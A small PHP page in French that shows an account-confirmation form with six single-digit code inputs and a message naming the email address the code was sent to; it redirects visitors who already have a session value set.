<?php
session_start();
if (isset($_SESSION["wa"])){
    header("location:../");
}
?>
<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirmer Votre compte</title>
    <link rel="stylesheet" href="../../style/c.css" />
  </head>
  <body>
    <header>
      Un code de confirmation a été envoyer a
      <span id="email"> Carineteoi@gmail.com</span>. Veuillez l'entrer pour confirmer
    </header>
    <main>
      <input type="text" maxlength="1" id="i1" placeholder="0" class="active"  />
      <input type="text" maxlength="1" id="i2" placeholder="1" disabled />
      <input type="text" maxlength="1" id="i3" placeholder="2" disabled />
      <input type="text" maxlength="1" id="i4" placeholder="3" disabled />
      <input type="text" maxlength="1" id="i5" placeholder="4" disabled />
      <input type="text" maxlength="1" id="i6" placeholder="4" style="display: none;"/>

    </main>
    <script src="../../js/c.js"></script>
  </body>
</html>
